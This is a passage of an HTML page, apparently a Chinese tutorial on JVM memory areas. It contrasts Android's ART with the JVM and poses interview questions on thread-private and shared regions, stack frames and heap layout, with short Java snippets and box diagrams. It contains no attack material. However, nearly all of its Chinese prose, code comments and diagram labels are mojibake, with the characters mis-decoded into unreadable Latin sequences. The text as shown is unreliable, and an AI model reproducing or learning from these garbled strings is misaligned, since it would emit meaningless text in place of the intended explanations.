        <span class="hljs-comment">// 1. objå¼•ç”¨ç›´æ¥æŒ‡å‘å †ä¸­çš„å¯¹è±¡</span>
        <span class="hljs-comment">// 2. é€šè¿‡å¯¹è±¡å¤´ä¸­çš„ç±»å‹æŒ‡é’ˆæ‰¾åˆ°ç±»ä¿¡æ¯</span>
        <span class="hljs-comment">// 3. è®¿é—®å¯¹è±¡æ—¶åªéœ€è¦ä¸€æ¬¡å†…å­˜è®¿é—®</span>
        
        obj.toString();  <span class="hljs-comment">// ç›´æ¥é€šè¿‡å¼•ç”¨è®¿é—®å¯¹è±¡ï¼Œæ•ˆç‡é«˜</span>
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-80">ç¬¬äº”éƒ¨åˆ†ï¼šAndroidè¯´æ˜ï¼ˆç®€è¦ï¼‰</h2>
<h3 data-id="heading-81">13. Androidä¸JVMçš„åŒºåˆ«è¯´æ˜</h3>
<h4 data-id="heading-82">13.1 é‡è¦è¯´æ˜</h4>
<p><strong>Androidå¼€å‘è¯­è¨€ï¼š</strong></p>
<ul>
<li>Androidå¼€å‘ä½¿ç”¨Javaè¯­è¨€ï¼ˆæˆ–Kotlinè¯­è¨€ï¼‰</li>
<li>è¯­æ³•å’ŒJavaç›¸åŒ</li>
</ul>
<p><strong>Androidè¿è¡Œæ—¶ï¼š</strong></p>
<ul>
<li>Androidè¿è¡Œåœ¨ARTï¼ˆAndroid Runtimeï¼‰ä¸Šï¼Œ<strong>ä¸æ˜¯JVM</strong></li>
<li>ARTä¸JVMæ˜¯ä¸¤ä¸ªä¸åŒçš„è¿è¡Œæ—¶ç¯å¢ƒ</li>
</ul>
<p><strong>å…³é”®åŒºåˆ«ï¼š</strong></p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>JVM</th><th>ART</th></tr></thead><tbody><tr><td><strong>ç¼–è¯‘æ–¹å¼</strong></td><td>è§£é‡Šæ‰§è¡Œ + JITç¼–è¯‘</td><td>AOTç¼–è¯‘ + JITç¼–è¯‘ï¼ˆAndroid 7.0+ï¼‰</td></tr><tr><td><strong>å†…å­˜ç®¡ç†</strong></td><td>JVMå†…å­˜åŒºåŸŸï¼ˆå †ã€æ ˆç­‰ï¼‰</td><td>ARTæœ‰è‡ªå·±çš„å†…å­˜ç®¡ç†æœºåˆ¶</td></tr><tr><td><strong>åƒåœ¾å›æ”¶</strong></td><td>JVMçš„GCç®—æ³•</td><td>ARTçš„GCç®—æ³•</td></tr><tr><td><strong>å‚æ•°è°ƒä¼˜</strong></td><td>JVMå‚æ•°ï¼ˆ-Xmxç­‰ï¼‰</td><td>ARTå‚æ•°ï¼ˆä¸åŒçš„å‚æ•°ï¼‰</td></tr></tbody></table>
<p><strong>é‡è¦ç»“è®ºï¼š</strong></p>
<ul>
<li>JVMå†…å­˜å‚æ•°è°ƒä¼˜<strong>ä¸é€‚ç”¨äºAndroidå¼€å‘</strong></li>
<li>Androidå¼€å‘éœ€è¦äº†è§£ARTçš„å†…å­˜ç®¡ç†æœºåˆ¶</li>
<li>è™½ç„¶è¯­æ³•ç›¸åŒï¼Œä½†è¿è¡Œæ—¶ç¯å¢ƒå®Œå…¨ä¸åŒ</li>
</ul>
<h4 data-id="heading-83">13.2 ARTä¸JVMçš„ä¸»è¦åŒºåˆ«ï¼ˆç®€è¦ï¼‰</h4>
<p><strong>1. ç¼–è¯‘æ–¹å¼ä¸åŒï¼š</strong></p>
<ul>
<li><strong>JVM</strong>ï¼šè§£é‡Šæ‰§è¡Œå­—èŠ‚ç  + JITç¼–è¯‘çƒ­ç‚¹ä»£ç </li>
<li><strong>ART</strong>ï¼šAOTï¼ˆAhead-Of-Timeï¼‰ç¼–è¯‘ï¼Œå®‰è£…æ—¶ç¼–è¯‘ä¸ºæœºå™¨ç </li>
</ul>
<p><strong>2. å†…å­˜ç®¡ç†ä¸åŒï¼š</strong></p>
<ul>
<li><strong>JVM</strong>ï¼šä½¿ç”¨æœ¬æ–‡ä»‹ç»çš„JVMå†…å­˜åŒºåŸŸæ¨¡å‹</li>
<li><strong>ART</strong>ï¼šæœ‰è‡ªå·±çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œä¸å®Œå…¨ç­‰åŒäºJVM</li>
</ul>
<p><strong>3. åƒåœ¾å›æ”¶ä¸åŒï¼š</strong></p>
<ul>
<li><strong>JVM</strong>ï¼šå¤šç§GCç®—æ³•å’Œæ”¶é›†å™¨ï¼ˆSerialã€Parallelã€CMSã€G1ç­‰ï¼‰</li>
<li><strong>ART</strong>ï¼šä½¿ç”¨è‡ªå·±çš„GCç®—æ³•ï¼ˆå¹¶å‘æ ‡è®°æ¸…é™¤ç­‰ï¼‰</li>
</ul>
<h4 data-id="heading-84">13.3 ä¸ºä»€ä¹ˆéœ€è¦äº†è§£è¿™ä¸ªåŒºåˆ«</h4>
<p><strong>å­¦ä¹ ç›®çš„ï¼š</strong></p>
<ol>
<li><strong>ç†è§£Androidå’Œä¼ ç»ŸJavaåº”ç”¨çš„åŒºåˆ«</strong></li>
<li><strong>çŸ¥é“JVMå†…å­˜æ¨¡å‹ä¸»è¦é€‚ç”¨äºä¼ ç»ŸJavaåº”ç”¨</strong></li>
<li><strong>Androidå¼€å‘éœ€è¦äº†è§£ARTçš„å†…å­˜ç®¡ç†ï¼Œè€Œä¸æ˜¯JVM</strong></li>
</ol>
<p><strong>å®é™…åº”ç”¨ï¼š</strong></p>
<ul>
<li>å¦‚æœæ˜¯ä¼ ç»ŸJavaåº”ç”¨å¼€å‘ï¼Œå­¦ä¹ JVMå†…å­˜æ¨¡å‹</li>
<li>å¦‚æœæ˜¯Androidå¼€å‘ï¼Œéœ€è¦å­¦ä¹ ARTçš„å†…å­˜ç®¡ç†æœºåˆ¶</li>
<li>ä¸¤è€…è™½ç„¶æœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œä½†æ˜¯ä¸åŒçš„æŠ€æœ¯æ ˆ</li>
</ul>
<hr/>
<h2 data-id="heading-85">ç¬¬å…­éƒ¨åˆ†ï¼šé¢è¯•é¢˜</h2>
<h3 data-id="heading-86">14. JVMå†…å­˜åŒºåŸŸé¢è¯•é¢˜</h3>
<h4 data-id="heading-87">14.1 åŸºç¡€æ¦‚å¿µé¢˜</h4>
<p><strong>1. JVMå†…å­˜åŒºåŸŸæœ‰å“ªäº›ï¼Ÿè¯·ç”»å‡ºæ•´ä½“æ¶æ„å›¾</strong></p>
<p>JVMå†…å­˜åŒºåŸŸåŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>çº¿ç¨‹ç§æœ‰åŒºåŸŸ</strong>ï¼šç¨‹åºè®¡æ•°å™¨ã€è™šæ‹Ÿæœºæ ˆã€æœ¬åœ°æ–¹æ³•æ ˆ</li>
<li><strong>çº¿ç¨‹å…±äº«åŒºåŸŸ</strong>ï¼šJavaå †ã€æ–¹æ³•åŒº</li>
<li><strong>ç›´æ¥å†…å­˜</strong>ï¼šå †å¤–å†…å­˜ï¼ŒNIOä½¿ç”¨</li>
</ul>
<p>æ•´ä½“æ¶æ„å›¾ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">JVMå†…å­˜åŒºåŸŸæ•´ä½“æ¶æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç¨‹åºè®¡æ•°å™¨ (ç§æœ‰)   â”‚
â”‚  è™šæ‹Ÿæœºæ ˆ (ç§æœ‰)     â”‚
â”‚  æœ¬åœ°æ–¹æ³•æ ˆ (ç§æœ‰)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    Javaå † (å…±äº«)     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚æ–°ç”Ÿä»£â”‚  â”‚è€å¹´ä»£â”‚  â”‚
â”‚  â”‚ Eden â”‚  â”‚     â”‚  â”‚
â”‚  â”‚ S0S1 â”‚  â”‚     â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   æ–¹æ³•åŒº (å…±äº«)      â”‚
â”‚  è¿è¡Œæ—¶å¸¸é‡æ±         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç›´æ¥å†…å­˜ (å †å¤–)    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>2. å“ªäº›åŒºåŸŸæ˜¯çº¿ç¨‹å…±äº«çš„ï¼Ÿå“ªäº›æ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼Ÿ</strong></p>
<ul>
<li><strong>çº¿ç¨‹ç§æœ‰åŒºåŸŸ</strong>ï¼šç¨‹åºè®¡æ•°å™¨ã€è™šæ‹Ÿæœºæ ˆã€æœ¬åœ°æ–¹æ³•æ ˆ</li>
<li><strong>çº¿ç¨‹å…±äº«åŒºåŸŸ</strong>ï¼šJavaå †ã€æ–¹æ³•åŒº</li>
</ul>
<p><strong>3. çº¿ç¨‹ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>ä¸»è¦åŒºåˆ«ï¼š</p>













































<table><thead><tr><th>ç‰¹æ€§</th><th>çº¿ç¨‹ç§æœ‰åŒºåŸŸ</th><th>çº¿ç¨‹å…±äº«åŒºåŸŸ</th></tr></thead><tbody><tr><td><strong>ç”Ÿå‘½å‘¨æœŸ</strong></td><td>ä¸çº¿ç¨‹ç›¸åŒï¼Œçº¿ç¨‹åˆ›å»ºæ—¶åˆ›å»ºï¼Œçº¿ç¨‹é”€æ¯æ—¶é”€æ¯</td><td>ä¸JVMç›¸åŒï¼ŒJVMå¯åŠ¨æ—¶åˆ›å»ºï¼ŒJVMå…³é—­æ—¶é”€æ¯</td></tr><tr><td><strong>è®¿é—®æ–¹å¼</strong></td><td>çº¿ç¨‹ç‹¬ç«‹è®¿é—®ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„åŒºåŸŸ</td><td>æ‰€æœ‰çº¿ç¨‹å…±äº«è®¿é—®åŒä¸€ä¸ªåŒºåŸŸ</td></tr><tr><td><strong>çº¿ç¨‹å®‰å…¨</strong></td><td>å¤©ç„¶çº¿ç¨‹å®‰å…¨ï¼Œæ— éœ€åŒæ­¥æœºåˆ¶</td><td>éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</td></tr><tr><td><strong>å­˜å‚¨å†…å®¹</strong></td><td>å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°ã€è¿”å›å€¼ç­‰</td><td>å¯¹è±¡å®ä¾‹ã€ç±»ä¿¡æ¯ã€å¸¸é‡ç­‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>ä¸çº¿ç¨‹æ•°æˆæ­£æ¯”ï¼ˆæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰æ ˆï¼‰</td><td>ä¸å¯¹è±¡æ•°ç›¸å…³ï¼Œä¸çº¿ç¨‹æ•°æ— å…³</td></tr><tr><td><strong>GCå½±å“</strong></td><td>ä¸æ¶‰åŠGCï¼Œçº¿ç¨‹é”€æ¯æ—¶è‡ªåŠ¨å›æ”¶</td><td>GCçš„ä¸»è¦åŒºåŸŸï¼Œéœ€è¦åƒåœ¾å›æ”¶</td></tr><tr><td><strong>è®¿é—®é€Ÿåº¦</strong></td><td>å¿«é€Ÿï¼Œæ— éœ€åŒæ­¥ï¼Œç›´æ¥è®¿é—®</td><td>éœ€è¦åŒæ­¥ï¼Œå¯èƒ½è¾ƒæ…¢</td></tr></tbody></table>
<p><strong>å…³é”®åŒºåˆ«æ€»ç»“ï¼š</strong></p>
<ol>
<li><strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šç§æœ‰åŒºåŸŸéšçº¿ç¨‹ï¼Œå…±äº«åŒºåŸŸéšJVM</li>
<li><strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šç§æœ‰åŒºåŸŸå¤©ç„¶å®‰å…¨ï¼Œå…±äº«åŒºåŸŸéœ€è¦åŒæ­¥</li>
<li><strong>GCå½±å“</strong>ï¼šç§æœ‰åŒºåŸŸä¸æ¶‰åŠGCï¼Œå…±äº«åŒºåŸŸæ˜¯GCçš„ä¸»è¦åŒºåŸŸ</li>
<li><strong>è®¿é—®é€Ÿåº¦</strong>ï¼šç§æœ‰åŒºåŸŸå¿«é€Ÿï¼Œå…±äº«åŒºåŸŸéœ€è¦åŒæ­¥</li>
</ol>
<p><strong>4. ä¸ºä»€ä¹ˆéœ€è¦åŒºåˆ†çº¿ç¨‹ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸï¼Ÿ</strong></p>
<p>ä¸»è¦è®¾è®¡åŸå› ï¼š</p>
<ol>
<li>
<p><strong>æ€§èƒ½è€ƒè™‘</strong></p>
<ul>
<li>ç§æœ‰åŒºåŸŸï¼šè®¿é—®å¿«é€Ÿï¼Œæ— éœ€åŒæ­¥æœºåˆ¶ï¼Œæé«˜æ‰§è¡Œæ•ˆç‡</li>
<li>å…±äº«åŒºåŸŸï¼šç»Ÿä¸€ç®¡ç†ï¼Œå‡å°‘å†…å­˜å ç”¨ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹å®‰å…¨</strong></p>
<ul>
<li>ç§æœ‰åŒºåŸŸï¼šå¤©ç„¶çº¿ç¨‹å®‰å…¨ï¼Œé¿å…æ•°æ®ç«äº‰ï¼Œç®€åŒ–ç¼–ç¨‹</li>
<li>å…±äº«åŒºåŸŸï¼šéœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œä½†å…è®¸çº¿ç¨‹é—´é€šä¿¡</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜ç®¡ç†</strong></p>
<ul>
<li>ç§æœ‰åŒºåŸŸï¼šéšçº¿ç¨‹é”€æ¯è‡ªåŠ¨å›æ”¶ï¼Œç®¡ç†ç®€å•</li>
<li>å…±äº«åŒºåŸŸï¼šéœ€è¦GCç»Ÿä¸€ç®¡ç†ï¼Œç”Ÿå‘½å‘¨æœŸé•¿</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®éš”ç¦»</strong></p>
<ul>
<li>ç§æœ‰åŒºåŸŸï¼šçº¿ç¨‹é—´æ•°æ®éš”ç¦»ï¼Œé¿å…ç›¸äº’å¹²æ‰°</li>
<li>å…±äº«åŒºåŸŸï¼šå…è®¸çº¿ç¨‹é—´æ•°æ®å…±äº«å’Œé€šä¿¡ï¼Œå®ç°åä½œ</li>
</ul>
</li>
</ol>
<p><strong>å®é™…å¥½å¤„ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç§æœ‰åŒºåŸŸï¼šæ— éœ€åŒæ­¥ï¼Œæ€§èƒ½å¥½</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// åœ¨æ ˆä¸­ï¼Œçº¿ç¨‹ç§æœ‰ï¼Œæ— éœ€åŒæ­¥</span>
    local++;  <span class="hljs-comment">// å¿«é€Ÿï¼Œæ— éœ€åŠ é”</span>
}

<span class="hljs-comment">// å…±äº«åŒºåŸŸï¼šéœ€è¦åŒæ­¥ï¼Œä½†å…è®¸çº¿ç¨‹é—´é€šä¿¡</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// åœ¨å †ä¸­ï¼Œçº¿ç¨‹å…±äº«</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    shared++;  <span class="hljs-comment">// éœ€è¦åŒæ­¥ï¼Œä½†å…è®¸å¤šä¸ªçº¿ç¨‹åä½œ</span>
}
</code></pre>
<p><strong>5. çº¿ç¨‹ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸå„è‡ªçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li><strong>ç§æœ‰åŒºåŸŸçš„ä½œç”¨</strong>ï¼šå­˜å‚¨çº¿ç¨‹ç§æœ‰æ•°æ®ã€è®°å½•æ‰§è¡ŒçŠ¶æ€ã€ä¿è¯çº¿ç¨‹å®‰å…¨</li>
<li><strong>å…±äº«åŒºåŸŸçš„ä½œç”¨</strong>ï¼šå­˜å‚¨å…±äº«æ•°æ®ã€çº¿ç¨‹é—´é€šä¿¡ã€èµ„æºå…±äº«</li>
</ul>
<p><strong>6. æ•°æ®æ˜¯å¦‚ä½•åœ¨ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸä¹‹é—´æµè½¬çš„ï¼Ÿ</strong></p>
<p>æ•°æ®æµè½¬çš„å®Œæ•´è¿‡ç¨‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è¯»å–å¼•ç”¨ï¼šå †(å…±äº«) â†’ æ ˆ(ç§æœ‰)
   çº¿ç¨‹ä»å †ä¸­è¯»å–å¯¹è±¡å¼•ç”¨ï¼Œå­˜å‚¨åˆ°æ ˆçš„å±€éƒ¨å˜é‡è¡¨ä¸­

<span class="hljs-bullet">2.</span> æ“ä½œå¼•ç”¨ï¼šåœ¨æ ˆä¸­æ“ä½œå¯¹è±¡å¼•ç”¨
   çº¿ç¨‹åœ¨æ ˆä¸­å¯¹å¼•ç”¨è¿›è¡Œæ“ä½œï¼ˆèµ‹å€¼ã€ä¼ é€’ç­‰ï¼‰

<span class="hljs-bullet">3.</span> è®¿é—®å¯¹è±¡ï¼šæ ˆ(ç§æœ‰) â†’ å †(å…±äº«)
   çº¿ç¨‹é€šè¿‡æ ˆä¸­çš„å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡

<span class="hljs-bullet">4.</span> ä¿®æ”¹å¯¹è±¡ï¼šä¿®æ”¹å †ä¸­çš„å¯¹è±¡ï¼ˆéœ€è¦åŒæ­¥ï¼‰
   å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå¯¹è±¡æ—¶éœ€è¦åŒæ­¥æœºåˆ¶
</code></pre>
<p><strong>å®é™…ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataFlow</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ­¥éª¤1ï¼šä»å †è¯»å–å¼•ç”¨åˆ°æ ˆ</span>
        <span class="hljs-type">DataFlow</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>;  <span class="hljs-comment">// objå¼•ç”¨åœ¨æ ˆä¸­ï¼ŒæŒ‡å‘å †ä¸­çš„å¯¹è±¡</span>
        
        <span class="hljs-comment">// æ­¥éª¤2ï¼šåœ¨æ ˆä¸­æ“ä½œå¼•ç”¨</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> obj.shared;  <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
        
        <span class="hljs-comment">// æ­¥éª¤3ï¼šä¿®æ”¹å †ä¸­çš„å¯¹è±¡ï¼ˆéœ€è¦åŒæ­¥ï¼‰</span>
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            obj.shared = <span class="hljs-number">100</span>;  <span class="hljs-comment">// ä¿®æ”¹å †ä¸­çš„å…±äº«å˜é‡</span>
        }
    }
}
</code></pre>
<p><strong>7. ç¨‹åºè®¡æ•°å™¨çš„ä½œç”¨å’Œç‰¹ç‚¹ï¼Ÿ</strong></p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>è®°å½•å½“å‰çº¿ç¨‹æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤åœ°å€</li>
<li>çº¿ç¨‹ç§æœ‰ï¼Œæ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹</li>
<li>åˆ†æ”¯ã€å¾ªç¯ã€è·³è½¬ã€å¼‚å¸¸å¤„ç†ã€çº¿ç¨‹æ¢å¤ç­‰éƒ½éœ€è¦ä¾èµ–ç¨‹åºè®¡æ•°å™¨</li>
</ul>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li>
<p><strong>å”¯ä¸€ä¸ä¼šå‘ç”ŸOutOfMemoryErrorçš„åŒºåŸŸ</strong></p>
<ul>
<li>ç¨‹åºè®¡æ•°å™¨å ç”¨çš„å†…å­˜å¾ˆå°ï¼Œå‡ ä¹å¯ä»¥å¿½ç•¥</li>
<li>ä¸ä¼šå› ä¸ºç¨‹åºè®¡æ•°å™¨çš„åŸå› å¯¼è‡´å†…å­˜æº¢å‡º</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹ç§æœ‰</strong></p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ç¨‹åºè®¡æ•°å™¨</li>
<li>çº¿ç¨‹ä¹‹é—´äº’ä¸å½±å“</li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡ŒNativeæ–¹æ³•æ—¶å€¼ä¸ºç©º</strong></p>
<ul>
<li>æ‰§è¡ŒJavaæ–¹æ³•æ—¶ï¼Œè®°å½•å­—èŠ‚ç æŒ‡ä»¤åœ°å€</li>
<li>æ‰§è¡ŒNativeæ–¹æ³•æ—¶ï¼Œå€¼ä¸ºç©ºï¼ˆundefinedï¼‰</li>
</ul>
</li>
</ol>
<p><strong>å®é™…åº”ç”¨ï¼š</strong></p>
<ul>
<li>çº¿ç¨‹åˆ‡æ¢æ—¶ä¿å­˜å’Œæ¢å¤æ‰§è¡Œä½ç½®</li>
<li>åˆ†æ”¯ã€å¾ªç¯ã€å¼‚å¸¸å¤„ç†ç­‰æ§åˆ¶æµçš„åŸºç¡€</li>
</ul>
<p><strong>8. Javaè™šæ‹Ÿæœºæ ˆçš„ä½œç”¨å’Œç»“æ„ï¼Ÿè¯·ç”»å‡ºæ ˆå¸§ç»“æ„å›¾</strong></p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>å­˜å‚¨å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°ã€è¿”å›å€¼ã€ä¸­é—´ç»“æœç­‰</li>
<li>æ¯ä¸ªæ–¹æ³•å¯¹åº”ä¸€ä¸ªæ ˆå¸§</li>
<li>çº¿ç¨‹ç§æœ‰</li>
</ul>
<p><strong>æ ˆå¸§ç»“æ„å›¾ï¼š</strong></p>
<pre><code class="hljs">æ ˆå¸§ç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ å±€éƒ¨å˜é‡è¡¨   â”‚ - å­˜å‚¨æ–¹æ³•å‚æ•°å’Œå±€éƒ¨å˜é‡
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ“ä½œæ•°æ ˆ     â”‚ - ç”¨äºè®¡ç®—å’Œä¸´æ—¶å­˜å‚¨
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ åŠ¨æ€é“¾æ¥     â”‚ - æŒ‡å‘è¿è¡Œæ—¶å¸¸é‡æ± çš„æ–¹æ³•å¼•ç”¨
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ–¹æ³•è¿”å›åœ°å€ â”‚ - æ–¹æ³•æ­£å¸¸è¿”å›æˆ–å¼‚å¸¸è¿”å›çš„åœ°å€
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>æ ˆå¸§å„éƒ¨åˆ†è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>å±€éƒ¨å˜é‡è¡¨</strong>ï¼šå­˜å‚¨æ–¹æ³•å‚æ•°å’Œå±€éƒ¨å˜é‡ï¼ˆåŸºæœ¬æ•°æ®ç±»å‹å’Œå¯¹è±¡å¼•ç”¨ï¼‰</li>
<li><strong>æ“ä½œæ•°æ ˆ</strong>ï¼šç”¨äºè®¡ç®—å’Œä¸´æ—¶å­˜å‚¨ï¼ŒLIFOç»“æ„</li>
<li><strong>åŠ¨æ€é“¾æ¥</strong>ï¼šæŒ‡å‘è¿è¡Œæ—¶å¸¸é‡æ± çš„æ–¹æ³•å¼•ç”¨ï¼Œæ”¯æŒå¤šæ€</li>
<li><strong>æ–¹æ³•è¿”å›åœ°å€</strong>ï¼šæ–¹æ³•é€€å‡ºåè¿”å›åˆ°å“ªæ¡æŒ‡ä»¤ç»§ç»­æ‰§è¡Œ</li>
</ol>
<p><strong>9. æ ˆå¸§åŒ…å«å“ªäº›éƒ¨åˆ†ï¼Ÿ</strong></p>
<ul>
<li>å±€éƒ¨å˜é‡è¡¨</li>
<li>æ“ä½œæ•°æ ˆ</li>
<li>åŠ¨æ€é“¾æ¥</li>
<li>æ–¹æ³•è¿”å›åœ°å€</li>
</ul>
<p><strong>10. å±€éƒ¨å˜é‡è¡¨çš„ä½œç”¨ï¼Ÿ</strong></p>
<p>å­˜å‚¨æ–¹æ³•å‚æ•°å’Œå±€éƒ¨å˜é‡ï¼ŒåŒ…æ‹¬åŸºæœ¬æ•°æ®ç±»å‹å’Œå¯¹è±¡å¼•ç”¨ã€‚</p>
<p><strong>11. æ“ä½œæ•°æ ˆçš„ä½œç”¨ï¼Ÿ</strong></p>
<p>ç”¨äºè®¡ç®—å’Œä¸´æ—¶å­˜å‚¨ï¼ŒLIFOç»“æ„ã€‚</p>
<p><strong>12. æœ¬åœ°æ–¹æ³•æ ˆçš„ä½œç”¨ï¼Ÿ</strong></p>
<p>ä¸ºNativeæ–¹æ³•æœåŠ¡ï¼Œä¸è™šæ‹Ÿæœºæ ˆç±»ä¼¼ä½†æœåŠ¡äºæœ¬åœ°æ–¹æ³•ã€‚</p>
<p><strong>13. Javaå †çš„ä½œç”¨å’Œç»“æ„ï¼Ÿè¯·ç”»å‡ºå †çš„ç»“æ„å›¾</strong></p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>å­˜å‚¨å¯¹è±¡å®ä¾‹å’Œæ•°ç»„</li>
<li>æ‰€æœ‰çº¿ç¨‹å…±äº«</li>
<li>JVMç®¡ç†çš„æœ€å¤§ä¸€å—å†…å­˜åŒºåŸŸ</li>
</ul>
<p><strong>å †çš„ç»“æ„å›¾ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">Javaå †ç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    æ–°ç”Ÿä»£(<span class="hljs-number">1</span>/<span class="hljs-number">3</span>)   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  <span class="hljs-built_in">Eden</span>(<span class="hljs-number">80%</span>)â”‚  â”‚ - æ–°å¯¹è±¡é¦–å…ˆåˆ†é…åœ¨è¿™é‡Œ
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”‚
â”‚  â”‚ <span class="hljs-built_in">S0</span>(<span class="hljs-number">10%</span>)S1 â”‚  â”‚ - Minor GCåå­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°è¿™é‡Œ
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   è€å¹´ä»£(<span class="hljs-number">2</span>/<span class="hljs-number">3</span>)    â”‚ - é•¿æœŸå­˜æ´»çš„å¯¹è±¡
